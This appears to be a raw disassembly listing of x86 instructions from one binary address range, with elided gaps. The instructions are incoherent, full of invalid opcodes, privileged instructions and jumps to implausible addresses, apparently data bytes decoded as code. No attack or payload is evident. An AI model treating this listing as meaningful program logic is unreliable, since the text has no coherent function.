  42dd9a:	fbld   TBYTE PTR [ebx+0x42]
  42dd9d:	push   eax
  42dd9e:	lock xor DWORD PTR [esp+edx*2],edx
  42dda2:	push   ebp
  42dda3:	call   0x883f0dd0
  42dda8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dda9:	xor    BYTE PTR [edi-0x44706bd9],cl
  42ddaf:	std    
  42ddb0:	xor    DWORD PTR [eax],edi
  42ddb2:	jmp    0x42de05
  42ddb4:	pop    ds
  42ddb5:	lahf   
  42ddb6:	dec    ecx
  42ddb7:	push   cs
  42ddb8:	adc    esp,DWORD PTR ds:0xc30b6dc
  42ddbe:	push   ecx
  42ddbf:	mov    ss,WORD PTR [ecx+0x75]
  42ddc2:	jl     0x42dde5
  42ddc4:	xor    ah,BYTE PTR [ebx]
  42ddc6:	pop    esp
  42ddc7:	les    ecx,FWORD PTR [edx*8+0x5f3305ff]
  42ddce:	inc    eax
  42ddcf:	pop    esp
  42ddd0:	(bad)  
  42ddd1:	dec    edx
  42ddd2:	jmp    0x42dd9c
  42ddd4:	xchg   ebx,eax
  42ddd5:	jne    0x42de2e
  42ddd7:	test   BYTE PTR [ebp-0xe],0xe7
  42dddb:	adc    DWORD PTR [edx],edi
  42dddd:	mov    cl,0xc6
  42dddf:	gs jbe 0x42dd90
  42dde2:	cmc    
  42dde3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dde4:	mov    al,0x4a
  42dde6:	mov    dh,0x6c
  42dde8:	and    cl,ah
  42ddea:	test   DWORD PTR [ebp-0x2b],esp
  42dded:	cmp    dl,al
  42ddef:	pop    ds
  42ddf0:	xor    cl,ah
  42ddf2:	adc    al,0x0
  42ddf4:	jb     0x42ddc5
  42ddf6:	data16 mov WORD PTR [esi-0x3e],?
  42ddfa:	xor    DWORD PTR [ebp-0x2823d127],esi
  42de00:	ja     0x42dda3
  42de02:	shl    DWORD PTR [esi+0x47],1
  42de05:	pop    esp
  42de06:	aas    
  42de07:	jg     0x42de85
  42de09:	push   esi
  42de0a:	cmp    eax,0xf2086030
  42de0f:	jae    0x42de20
  42de11:	fwait
  42de12:	scas   al,BYTE PTR es:[edi]
  42de13:	adc    BYTE PTR [ebx+0x63],bl
  42de16:	and    ecx,DWORD PTR [ebx-0x36]
  42de19:	jbe    0x42de6a
  42de1b:	repnz and edi,DWORD PTR [edi-0x199d4c7b]
  42de22:	sbb    eax,0x773a28b5
  42de27:	(bad)  
  42de28:	push   ebp
  42de29:	mov    dl,0x7d
  42de2b:	push   esp
  42de2c:	jg     0x42de4a
  42de2e:	pop    eax
  42de2f:	(bad)  
  42de30:	mov    ah,0x72
  42de32:	add    dh,BYTE PTR [ebp-0x26089a96]
  42de38:	pop    ds
  42de39:	sbb    DWORD PTR [ebx-0x2b0fb647],ecx
  42de3f:	mov    eax,0xe7
	...
  42deb4:	jae    0x42def3
  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi+0x184f450c]
  42dec3:	repnz adc esp,ebp
  42dec6:	add    DWORD PTR [eax],eax
  42dec8:	cmc    
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    BYTE PTR [ebx+0x18],dh
  42dece:	and    edx,DWORD PTR [ebx+0x755215c6]
  42ded4:	sbb    eax,0xfb57ab45
  42ded9:	or     edx,eax
  42dedb:	pusha  
  42dedc:	mov    al,0x18
  42dede:	mov    ah,al
  42dee0:	xchg   ecx,eax
  42dee1:	(bad)  
  42dee3:	xor    al,0x61
  42dee5:	cmp    eax,0x4ce6554a
  42deea:	rcr    BYTE PTR [edi+eiz*2],0xa4
  42deee:	repz lahf 
  42def0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42def1:	retf   
  42def2:	js     0x42dec7
  42def4:	jmp    0xab8f25cc
  42def9:	in     al,0x81
  42defb:	inc    ecx
  42defc:	das    
  42defd:	nop
  42defe:	pop    ebp
  42deff:	sub    al,0xef
  42df01:	addr16 push ds
  42df03:	xor    esi,esp
  42df05:	cmp    DWORD PTR [edx],ecx
  42df07:	(bad)  
  42df09:	and    edi,edi
  42df0b:	mov    esp,0xcc2451c1
  42df10:	loop   0x42dedd
  42df12:	sub    DWORD PTR ds:0x55580bc1,edx
  42df18:	fld    QWORD PTR [eax-0x7a157496]
  42df1e:	jecxz  0x42df96
  42df20:	inc    eax
  42df21:	jge    0x42dee1
  42df23:	mov    edx,0x61a5ea28
  42df28:	jge    0x42df1f
  42df2a:	idiv   cl
  42df2c:	pop    esi
  42df2d:	jp     0x42df81
  42df2f:	icebp  
  42df30:	lahf   
  42df31:	mov    al,0xa9
  42df33:	gs icebp 
  42df35:	pushf  
  42df36:	adc    al,ch
  42df38:	mov    ecx,0xdd8108ea
  42df3d:	gs dec edx
  42df3f:	mov    esp,0xe27ba31c
  42df44:	hlt    
  42df45:	add    eax,0x99195beb
  42df4a:	ins    BYTE PTR es:[edi],dx
  42df4b:	sbb    edi,DWORD PTR [eax+0x2eafa59b]
  42df51:	sub    DWORD PTR [esi-0x54700867],eax
  42df57:	call   0xb38c:0xa1e36fbb
  42df5e:	pusha  
  42df5f:	mov    dl,0xa
  42df61:	adc    eax,0x1e52196
  42df66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df67:	adc    DWORD PTR [edx+ebp*4+0x54],0x40
  42df6c:	pop    edi
  42df6d:	xor    eax,0xf05474e0
  42df72:	ret    0x6225
  42df75:	mov    ebx,0xd020530e
  42df7a:	gs xchg esi,eax
  42df7c:	cli    
  42df7d:	pop    esp
  42df7e:	mov    eax,0x32ec0b1c
  42df83:	out    dx,al
  42df84:	push   ss
  42df85:	cdq    
  42df86:	jl     0x42df54
  42df88:	ret    
  42df89:	pushf  
  42df8a:	sbb    BYTE PTR [eax+0x1529d830],dl
  42df90:	xor    esp,DWORD PTR [edx]
  42df92:	fldenv [ecx+ebp*1+0x66]
  42df96:	adc    dl,BYTE PTR [esi+0x6e54360b]
  42df9c:	iret   
  42df9d:	mov    al,ds:0x5eb86e42
  42dfa2:	push   0x21a79d2
  42dfa7:	lods   eax,DWORD PTR ds:[esi]
  42dfa8:	xor    eax,0x8771603e
  42dfad:	sbb    ecx,DWORD PTR [esi+edi*8-0x53]
  42dfb1:	js     0x42dfae
  42dfb3:	jns    0x42e017
  42dfb5:	push   eax
  42dfb6:	pop    edx
  42dfb7:	jmp    0x42df43
  42dfb9:	xchg   ebx,eax
  42dfba:	lock xchg DWORD PTR ds:[ebp+0x47cbb0],edx
	...
  42e032:	add    BYTE PTR [eax],al
  42e034:	push   eax
  42e035:	cmp    al,dh
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx-0x6176461e],0x5d
  42e044:	or     dh,ah
  42e046:	add    DWORD PTR [eax],eax
  42e048:	cmc    
  42e049:	add    BYTE PTR [eax],al
  42e04b:	add    BYTE PTR [edx+0x20],ah
  42e04e:	cmp    esi,esi
  42e050:	mov    dl,0x57
  42e052:	test   BYTE PTR [edx],cl
  42e054:	or     edi,DWORD PTR [edx+0x13]
  42e057:	neg    DWORD PTR [ecx+0x1c]
  42e05a:	mov    dh,0xf8
  42e05c:	inc    eax
  42e05d:	gs mov ecx,0x8b8a8595
  42e063:	call   0x61a83a5b
  42e068:	xchg   ebx,eax
  42e069:	imul   ecx,DWORD PTR [esi-0x3f5bb5b3],0x5e1e08e9
  42e073:	pop    ebx
  42e074:	mov    bl,0xff
  42e076:	add    bl,BYTE PTR [edi-0xc74f632]
  42e07c:	pushaw 
  42e07e:	pop    ebx
  42e07f:	cld    
  42e080:	(bad)  
  42e081:	in     eax,0xfd
  42e083:	call   0x23268a07
  42e088:	pop    eax
  42e089:	scas   al,BYTE PTR es:[edi]
  42e08a:	dec    esp
  42e08b:	adc    DWORD PTR [edi-0x2d],edi
  42e08e:	(bad)  
  42e08f:	aad    0x39
  42e091:	ret    0xd664
  42e094:	(bad)  
  42e095:	lods   eax,DWORD PTR ds:[esi]
  42e096:	cmc    
  42e097:	mov    cl,0xb9
  42e099:	and    al,0x4a
  42e09b:	sbb    ebx,esi
  42e09d:	fisttp DWORD PTR [esi-0x4ab30796]
  42e0a3:	aas    
  42e0a4:	es xchg edi,esp
  42e0a7:	sbb    al,0x56
  42e0a9:	push   esi
  42e0aa:	js     0x42e094
  42e0ac:	ja     0x42e088
  42e0ae:	and    bh,0xcb
  42e0b1:	sti    
  42e0b2:	adc    al,0xe
  42e0b4:	gs gs es mov dh,0x2d
  42e0b9:	pop    esp
  42e0ba:	lock or BYTE PTR [ebx],dh
  42e0bd:	jmp    0x42e0e8
  42e0bf:	ins    DWORD PTR es:[edi],dx
  42e0c0:	mov    eax,0x766a9b61
  42e0c5:	lods   eax,DWORD PTR ds:[esi]
  42e0c6:	lds    ebx,FWORD PTR [eax-0x1f6da601]
  42e0cc:	sbb    cl,0x4b
  42e0cf:	cmp    al,0xc5
  42e0d1:	test   DWORD PTR [ebx-0x1e00b0bd],esi
  42e0d7:	ret    0xc845
  42e0da:	test   al,0xa5
  42e0dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e0dd:	sahf   
  42e0de:	dec    edi
  42e0df:	fdivr  QWORD PTR [edi-0x23]
  42e0e2:	gs pop ecx
  42e0e4:	add    ah,BYTE PTR [ecx]
  42e0e6:	addr16 in al,0x6b
  42e0e9:	cmpxchg BYTE PTR ds:0xa74ae3da,dh
  42e0f0:	xor    eax,esp
  42e0f2:	in     al,0xe7
  42e0f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e0f5:	mov    WORD PTR [esi+ecx*8-0x4c],ds
  42e0f9:	lock or bh,ah
  42e0fc:	and    BYTE PTR [ebx-0x7d],ch
  42e0ff:	outs   dx,DWORD PTR ds:[esi]
  42e100:	mov    ah,0x26
  42e102:	jno    0x42e11d
  42e104:	adc    esi,0xfffffff6
  42e107:	es mov al,0x50
  42e10a:	(bad)  
  42e10b:	popf   
  42e10c:	int3   
  42e10d:	xchg   esp,eax
  42e10e:	push   esp
  42e10f:	cs adc al,0x26
  42e112:	mov    esi,0xe671e0e7
  42e117:	not    bl
  42e119:	sahf   
  42e11a:	xchg   edi,eax
  42e11b:	pop    ebp
  42e11c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e11d:	adc    eax,0x28c00a02
  42e122:	imul   BYTE PTR [ecx+ecx*4+0x10a1e168]
  42e129:	addr16 test edx,eax
  42e12c:	push   esp
  42e12d:	bound  ecx,QWORD PTR [edx-0xc2078e1]
  42e133:	(bad)  
  42e134:	sbb    al,0x5
  42e136:	daa    
  42e137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e138:	sbb    DWORD PTR [edi+0x6c43cea5],edx
  42e13e:	sub    al,0xca
  42e140:	stos   DWORD PTR es:[edi],eax
	...
  42e1b1:	add    BYTE PTR [eax],al
  42e1b3:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0xe0ba6b71
  42e1c3:	enter  0xe6fd,0x1
  42e1c7:	add    ch,dh
  42e1c9:	add    BYTE PTR [eax],al
  42e1cb:	add    BYTE PTR [ebx+edi*1+0x4bf1ca0f],ah
  42e1d2:	push   ebp
  42e1d3:	sub    esp,DWORD PTR [ebx]
  42e1d5:	pop    ebx
  42e1d6:	sbb    DWORD PTR fs:[ebp+0x3f79ca9f],eax
  42e1dd:	retf   0x76d
  42e1e0:	ja     0x42e207
  42e1e2:	adc    DWORD PTR [esi],ebp
  42e1e4:	js     0x42e20f
  42e1e6:	xchg   ebp,eax
  42e1e7:	jl     0x42e1c4
  42e1e9:	add    cl,BYTE PTR [ecx]
  42e1eb:	mov    esi,0xaddb7a4e
  42e1f0:	nop
  42e1f1:	dec    esi
  42e1f2:	fisub  DWORD PTR [esp+eax*8]
  42e1f5:	das    
  42e1f6:	sbb    BYTE PTR [ebx+eax*2+0xf310cfc],dl
  42e1fd:	mov    fs,esp
  42e1ff:	xor    al,0xbd
  42e201:	xchg   esi,eax
  42e202:	mov    ebp,0x4992f80e
  42e207:	clc    
  42e208:	sub    al,0xc0
  42e20a:	adc    al,0xe
  42e20c:	aas    
  42e20d:	ret    
  42e20e:	sbb    ch,BYTE PTR [edi]
  42e210:	and    bh,ah
  42e212:	test   BYTE PTR [ebx+0x11],bl
  42e215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e216:	adc    al,0xb4
  42e218:	dec    esp
  42e219:	out    0x58,eax
  42e21b:	pop    ebp
  42e21c:	cli    
  42e21d:	cmovo  esp,DWORD PTR [ebx]
  42e220:	ins    BYTE PTR es:[edi],dx
  42e221:	std    
  42e222:	js     0x42e285
  42e224:	leave  
  42e225:	xor    al,0xb3
  42e227:	imul   ebp,DWORD PTR [eax+0x1c],0xffffffb9
  42e22b:	mov    cl,0x22
  42e22d:	mov    esp,0x6f5593a3
  42e232:	mov    dl,0xfa
  42e234:	stos   BYTE PTR es:[edi],al
  42e235:	mov    eax,ds:0x5dce2dd4
  42e23a:	cs out dx,al
  42e23c:	les    eax,FWORD PTR [esi-0xd]
  42e23f:	add    al,0x2e
  42e241:	gs xor al,0xb6
  42e244:	mov    ebx,0x82854ca8
  42e249:	or     eax,0x88f31642
  42e24e:	xchg   BYTE PTR [esi*8-0x5200987d],dh
  42e255:	dec    edx
  42e256:	cmp    DWORD PTR [ebx-0x78],esi
  42e259:	xchg   ebx,eax
  42e25a:	mov    esp,0x19e8830d
  42e25f:	push   ss
  42e260:	mov    dh,0xfc
  42e262:	popf   
  42e263:	mov    ecx,0x46abb66a
  42e268:	in     eax,dx
  42e269:	int    0xc9
  42e26b:	mov    esp,0x37c6088c
  42e270:	nop
  42e271:	xchg   ebx,eax
  42e272:	xchg   edx,eax
  42e273:	sbb    BYTE PTR [esi+0x1c5bdb75],al
  42e279:	jnp    0x42e2f6
  42e27b:	fistp  DWORD PTR [esi-0x42b3692b]
  42e281:	cmp    ebx,DWORD PTR [edx-0xd87e4ae]
  42e287:	retf   0x8e12
  42e28a:	enter  0x85af,0xff
  42e28e:	push   edi
  42e28f:	lahf   
  42e290:	mov    bl,0x33
  42e292:	nop
  42e293:	xor    BYTE PTR [esi],al
  42e295:	mov    ds:0x38eb5d12,eax
  42e29a:	sbb    BYTE PTR [ecx-0x62],0xfd
  42e29e:	dec    edi
  42e29f:	rol    dh,0xcd
  42e2a2:	and    edx,eax
  42e2a4:	cmp    cl,BYTE PTR [ecx]
  42e2a6:	mov    al,ds:0x934c1051
  42e2ab:	ss out 0x9e,al
  42e2ae:	xor    al,BYTE PTR [esp+ebx*4+0x634cea97]
  42e2b5:	mov    eax,ds:0x7587a906
  42e2ba:	sub    al,0xc8
  42e2bc:	and    eax,0x79ffca4e
	...
  42e331:	add    BYTE PTR [eax],al
  42e333:	add    cl,al
  42e335:	into   
  42e336:	arpl   WORD PTR [ecx-0x21044291],bx
  42e33c:	inc    esi
  42e33d:	push   ecx
  42e33e:	cmc    
  42e33f:	or     ebx,esi
  42e341:	jo     0x42e2d7
  42e343:	xor    dl,0xe7
  42e346:	add    DWORD PTR [eax],eax
  42e348:	cmc    
  42e349:	add    BYTE PTR [eax],al
  42e34b:	add    BYTE PTR [eax+0x40],dh
  42e34e:	imul   edi,DWORD PTR [edx-0x769fe4ea],0xffffffb6
  42e355:	scas   al,BYTE PTR es:[edi]
  42e356:	mov    ebx,0x72cb94a7
  42e35b:	add    cl,ch
  42e35d:	add    ch,0x18
  42e360:	xor    DWORD PTR [ebx+0x70],eax
  42e363:	ins    DWORD PTR es:[edi],dx
  42e364:	into   
  42e365:	jecxz  0x42e3b7
  42e367:	stos   DWORD PTR es:[edi],eax
  42e368:	es inc ecx
  42e36a:	adc    eax,0xec936cd5
  42e36f:	xor    al,BYTE PTR [edx]
  42e371:	jne    0x42e368
  42e373:	xchg   ebx,eax
  42e374:	pop    ss
  42e375:	lods   eax,DWORD PTR ds:[esi]
  42e376:	js     0x42e306
  42e378:	mov    al,ds:0x7cae8d6b
  42e37d:	xchg   ecx,eax
  42e37e:	xor    BYTE PTR [eax-0x63],bh
  42e381:	retf   0xd6a6
  42e384:	gs in  al,dx
  42e386:	and    ecx,DWORD PTR [edx]
  42e388:	mov    ebp,gs
  42e38a:	fnsave es:[edx+edx*2]
  42e38e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e38f:	dec    ebx
  42e390:	pop    esp
  42e391:	jnp    0x42e373
  42e393:	or     eax,0x61875323
  42e398:	mov    ebp,0x48675a9d
  42e39d:	arpl   WORD PTR [eax+0x5609ddce],di
  42e3a3:	mov    dh,0x91
  42e3a5:	hlt    
  42e3a6:	sbb    DWORD PTR [esi-0x12835267],edi
  42e3ac:	cmp    DWORD PTR [edx+0x73],ebx
  42e3af:	imul   ebp,DWORD PTR [esi],0xa2264cb3
  42e3b5:	fs in  al,0x8d
  42e3b8:	in     al,0xdb
  42e3ba:	xchg   edi,eax
  42e3bb:	or     al,0x6
  42e3bd:	jge    0x42e347
  42e3bf:	adc    BYTE PTR [esi-0x4b],bh
  42e3c2:	ja     0x42e3d6
  42e3c4:	fmul   QWORD PTR [ebp+eax*8-0x1]
  42e3c8:	call   0xdd21:0xe171e727
  42e3cf:	mov    ebp,0x249e88c1
  42e3d4:	dec    esp
  42e3d5:	push   ds
  42e3d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e3d7:	pop    ebx
  42e3d8:	adc    edx,DWORD PTR [edi]
  42e3da:	in     al,0xf5
  42e3dc:	loope  0x42e3aa
  42e3de:	ror    DWORD PTR [ebx-0x719ba122],1
  42e3e4:	pop    edi
  42e3e5:	push   ebp
  42e3e6:	jne    0x42e3d7
  42e3e8:	push   ds
  42e3e9:	jno    0x42e42b
  42e3eb:	jo     0x42e381
  42e3ed:	adc    esp,0x5f23cafb
  42e3f3:	out    0x2b,eax
  42e3f5:	adc    al,0x97
  42e3f7:	int3   
  42e3f8:	repz adc eax,0x389c7a50
  42e3fe:	loope  0x42e38d
  42e400:	loope  0x42e42d
  42e402:	xchg   esp,eax
  42e403:	add    ch,BYTE PTR [esi]
  42e405:	pop    ebp
  42e406:	jecxz  0x42e3dd
  42e408:	sbb    BYTE PTR [ebp-0x12],dl
  42e40b:	imul   edi,DWORD PTR [eax+0x153e80f4],0x64
  42e412:	fdiv   st(2),st
  42e414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e415:	aaa    
  42e416:	mov    dh,0xd1
  42e418:	xchg   si,ax
  42e41a:	imul   ecx,DWORD PTR [ebx+0x7fd209c9],0xd8905db0
  42e424:	add    DWORD PTR [ecx-0x2],edx
  42e427:	push   ebx
  42e428:	inc    eax
  42e429:	adc    al,0x71
  42e42b:	mov    ss,WORD PTR [esi-0x12d8a3c1]
  42e431:	addr16 xchg esp,eax
  42e433:	push   edi
  42e434:	int    0xb0
  42e436:	mov    edx,0xb166a811
  42e43b:	dec    esi
  42e43c:	(bad)
  42e440:	xchg   edi,eax
	...
  42e4b1:	add    BYTE PTR [eax],al
  42e4b3:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42e4b9:	ja     0x42e494
  42e4bb:	dec    DWORD PTR [edi]
  42e4bd:	jecxz  0x42e4a2
  42e4bf:	mov    esp,0x61c51b12
  42e4c4:	out    0xe8,eax
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	cmc    
  42e4c9:	add    BYTE PTR [eax],al
  42e4cb:	add    BYTE PTR [ecx+0x79],al
  42e4ce:	lods   eax,DWORD PTR ds:[esi]
  42e4cf:	xchg   ebp,eax
  42e4d0:	lods   eax,DWORD PTR es:[esi]
  42e4d2:	rcl    al,0x50
  42e4d5:	mov    ebx,edx
  42e4d7:	or     eax,0xe00af90d
  42e4dc:	mov    ebp,0xc56ba271
  42e4e1:	jge    0x42e548
  42e4e3:	sub    ah,BYTE PTR [ecx-0x3d]
  42e4e6:	es call 0xd12213d7
  42e4ec:	popa   
  42e4ed:	xchg   edx,eax
  42e4ee:	into   
  42e4ef:	mov    ds:0xd19108ed,al
  42e4f4:	jecxz  0x42e56f
  42e4f6:	sbb    cl,BYTE PTR [ebp-0x37]
  42e4f9:	in     eax,0x32
  42e4fb:	ret    0x12eb
  42e4fe:	das    
  42e4ff:	int    0xdf
  42e501:	jge    0x42e528
  42e503:	mov    ebp,0x678face9
  42e508:	lods   eax,DWORD PTR ds:[esi]
  42e509:	jecxz  0x42e53e
  42e50b:	and    DWORD PTR [edx-0x61],ecx
  42e50e:	mov    esp,0x6c4323fb
  42e513:	out    dx,al
  42e514:	jne    0x42e53e
  42e516:	and    BYTE PTR [edi-0x7c],cl
  42e519:	adc    al,0x32
  42e51b:	jo     0x42e537
  42e51d:	cmc    
  42e51e:	xchg   esi,eax
  42e51f:	mov    bl,0xe3
  42e521:	sbb    eax,0xe3fd6533
  42e526:	pop    ds
  42e527:	and    ebx,DWORD PTR [ebx+0x3a]
  42e52a:	lds    esi,FWORD PTR cs:[ecx-0x59]
  42e52e:	sti    
  42e52f:	mov    al,0x3c
  42e531:	xchg   ebp,eax
  42e532:	scas   eax,DWORD PTR es:[edi]
  42e533:	cmp    al,0xcc
  42e535:	stc    
  42e536:	dec    eax
  42e537:	sub    eax,0xab855542
  42e53c:	add    edx,edx
  42e53e:	add    al,0xdc
  42e540:	stos   DWORD PTR es:[edi],eax
  42e541:	xor    bl,BYTE PTR [edi+0x759ffffd]
  42e547:	adc    al,BYTE PTR [edi]
  42e549:	or     esi,DWORD PTR ds:0x39c0bd2f
  42e54f:	inc    ecx
  42e550:	(bad)  
  42e551:	pop    ebp
  42e552:	or     al,0xa9
  42e554:	jg     0x42e55e
  42e556:	fnstcw WORD PTR [edi+eax*1-0x1d0b021a]
  42e55d:	pushf  
  42e55e:	and    eax,0x8e76b578
  42e563:	cmp    al,0x65
  42e565:	sub    eax,0xefb35e6a
  42e56a:	mov    ds:0xad6ff8ef,al
  42e56f:	mov    eax,esi
  42e571:	mov    BYTE PTR [ecx],bl
  42e573:	jbe    0x42e515
  42e575:	and    DWORD PTR [ecx+0x44],0x47ecbe58
  42e57c:	fwait
  42e57d:	push   ebx
  42e57e:	mov    dl,0xd6
  42e580:	add    BYTE PTR [eax-0x58],bh
  42e583:	js     0x42e5c0
  42e585:	(bad)  
  42e586:	out    0x4e,al
  42e588:	cmc    
  42e589:	push   edx
  42e58a:	dec    ebx
  42e58b:	cld    
  42e58c:	stc    
  42e58d:	lea    eax,[esi-0x78]
  42e590:	jp     0x42e606
  42e592:	cli    
  42e593:	cmp    ch,cl
  42e595:	lahf   
  42e596:	and    bl,ch
  42e598:	maskmovq mm0,(bad)
  42e599:	test   DWORD PTR [ecx-0xa],0x157d27b9
  42e5a0:	xchg   edx,eax
  42e5a1:	pop    edx
  42e5a2:	ss add al,0x1d
  42e5a5:	pop    ebp
  42e5a6:	out    0xd9,eax
  42e5a8:	xchg   esi,ecx
  42e5aa:	repz dec ebx
  42e5ac:	push   ebx
  42e5ad:	cli    
  42e5ae:	repnz fmul QWORD PTR [edx+esi*4]
  42e5b2:	add    esp,DWORD PTR [edi]
  42e5b4:	mov    eax,ds:0x7be03078
  42e5b9:	repz jmp 0x163a89d9
  42e5bf:	int3   
  42e5c0:	rol    DWORD PTR [eax],1
	...
  42e632:	add    BYTE PTR [eax],al
  42e634:	repz add esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	dec    eax
  42e641:	xchg   edi,eax
  42e642:	push   es
  42e643:	sub    esp,ebx
  42e645:	jmp    0x137e64b
  42e64a:	add    BYTE PTR [eax],al
  42e64c:	add    cl,BYTE PTR [esi+eiz*2+0x49bffc45]
  42e653:	inc    ebp
  42e654:	add    DWORD PTR es:[eax-0x24d7cb1f],esp
  42e65b:	sbb    DWORD PTR [esi],ebx
  42e65d:	fucomi st,st(3)
  42e65f:	mov    ebp,DWORD PTR [edi+0x29]
  42e662:	pop    ds
  42e663:	stos   DWORD PTR es:[edi],eax
  42e664:	ret    
  42e665:	js     0x42e6b4
  42e667:	xchg   esp,eax
  42e668:	mov    dl,al
  42e66a:	lea    ecx,[eax-0x5e956bf5]
  42e670:	ror    dl,1
  42e672:	ror    DWORD PTR fs:[eax+0x35],cl
  42e676:	mov    bl,0xbf
  42e678:	cmp    ebx,DWORD PTR [edi+0x12]
  42e67b:	or     cl,BYTE PTR [ecx]
  42e67d:	pop    esp
  42e67e:	repz dec eax
  42e680:	jo     0x42e64e
  42e682:	sar    BYTE PTR [ecx+0xb0cd001],cl
  42e688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e689:	ror    DWORD PTR [edi],0x69
  42e68c:	shl    DWORD PTR [edi],cl
  42e68e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e68f:	arpl   WORD PTR [eax+0x3b99cad7],si
  42e695:	call   0xb50a:0x53662873
  42e69c:	out    0xa,al
  42e69e:	mov    eax,0x9b00f170
  42e6a3:	mov    eax,ds:0x4c4ba20a
  42e6a8:	inc    ebp
  42e6a9:	jecxz  0x42e704
  42e6ab:	push   ebx
  42e6ac:	sub    DWORD PTR [ebx+ebp*2+0x75d6ea13],edx
  42e6b3:	cli    
  42e6b4:	addr16 or ch,al
  42e6b7:	adc    BYTE PTR [ecx+0x26c8ac4b],dh
  42e6bd:	les    edx,FWORD PTR [edx+0x2b]
  42e6c0:	jecxz  0x42e72b
  42e6c2:	sub    eax,0x53489c64
  42e6c7:	out    0x89,eax
  42e6c9:	out    dx,al
  42e6ca:	rcl    BYTE PTR [eax-0x3b],cl
  42e6cd:	int3   
  42e6ce:	int    0x26
  42e6d0:	(bad)  
  42e6d1:	arpl   WORD PTR [edx+0x4b],di
  42e6d4:	and    DWORD PTR [esi],ebp
  42e6d6:	pop    ecx
  42e6d7:	out    dx,eax
  42e6d8:	sbb    ebp,DWORD PTR [esi+0x25ee8fa3]
  42e6de:	mov    ebx,0x6462a3b4
  42e6e3:	push   edx
  42e6e4:	adc    BYTE PTR [ecx-0x34],ah
  42e6e7:	push   ebx
  42e6e8:	push   cs
  42e6e9:	or     edi,ebx
  42e6eb:	sti    
  42e6ec:	sti    
  42e6ed:	lods   al,BYTE PTR ds:[esi]
  42e6ee:	push   edx
  42e6ef:	std    
  42e6f0:	test   DWORD PTR [esi+ebx*8+0x51],edi
  42e6f4:	lahf   
  42e6f5:	enter  0xddfa,0x1f
  42e6f9:	jge    0x42e6ed
  42e6fb:	sub    bh,BYTE PTR ds:0x42c2a670
  42e701:	ds sahf 
  42e703:	fdiv   QWORD PTR [edi+0x6418c3bd]
  42e709:	fmul   QWORD PTR [ebp+edx*4-0x54]
  42e70e:	or     DWORD PTR [edi],0x8741308c
  42e714:	add    al,0x9d
  42e716:	jp     0x42e784
  42e718:	sbb    BYTE PTR [edx-0x5cfed253],dl
  42e71e:	adc    al,0x27
  42e720:	xchg   ebx,eax
  42e721:	ja     0x42e6d0
  42e723:	or     eax,0x250ca863
  42e728:	add    esp,DWORD PTR [eax-0x4]
  42e72b:	and    BYTE PTR [esi+0x313dbb54],ah
  42e731:	sbb    ch,ah
  42e733:	(bad)  
  42e734:	sub    al,0xb
  42e736:	and    DWORD PTR [edi+0x71],eax
  42e739:	fisttp DWORD PTR [edi+0x38]
  42e73c:	xchg   DWORD PTR [edi],esi
  42e73e:	xchg   edi,eax
  42e73f:	arpl   WORD PTR [ebx+0x0],bp
	...
  42e7b2:	add    BYTE PTR [eax],al
  42e7b4:	xchg   esi,eax
  42e7b5:	fwait
  42e7b6:	cwde   
  42e7b7:	pop    edi
  42e7b8:	popf   
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi-0x3f2aa8a]
  42e7c1:	mov    bl,0x92
  42e7c3:	aam    0xd1
  42e7c5:	jmp    0x0:0xf50001
  42e7cc:	xchg   ebp,eax
  42e7cd:	fcom   DWORD PTR [ecx-0x64c9671e]
  42e7d3:	jmp    0x3c78029d
  42e7d8:	add    BYTE PTR [edx-0x3d],bh
  42e7db:	inc    esp
  42e7dc:	repz push eax
  42e7df:	sub    ecx,DWORD PTR [ebx]
  42e7e1:	gs (bad) 
  42e7e3:	jmp    0x42e843
  42e7e5:	mov    BYTE PTR [edi+0x5fc10059],cl
  42e7eb:	mov    DWORD PTR [ecx-0x1],edi
  42e7ee:	cdq    
  42e7ef:	int3   
  42e7f0:	push   ss
  42e7f1:	jmp    0x3eda:0xb158be86
  42e7f8:	add    al,0x67
  42e7fa:	imul   eax,edx,0x42dd4e8c
  42e800:	cs dec eax
  42e803:	inc    eax
  42e804:	popf   
  42e805:	jns    0x42e7df
  42e807:	and    BYTE PTR ds:0x45e9a626,cl
  42e80d:	xchg   ebx,eax
  42e80e:	cmp    cl,BYTE PTR [esp]
  42e811:	ja     0x42e86f
  42e813:	cmp    cl,bh
  42e815:	cmp    DWORD PTR [esi+0x2a],edx
  42e818:	leave  
  42e819:	xor    al,0x30
  42e81b:	xor    al,0x19
  42e81d:	icebp  
  42e81e:	ror    cl,1
  42e820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e821:	retf   
  42e822:	dec    edi
  42e823:	adc    BYTE PTR [eax+0x705916a6],0x9c
  42e82a:	(bad)  [ecx-0x5684877f]
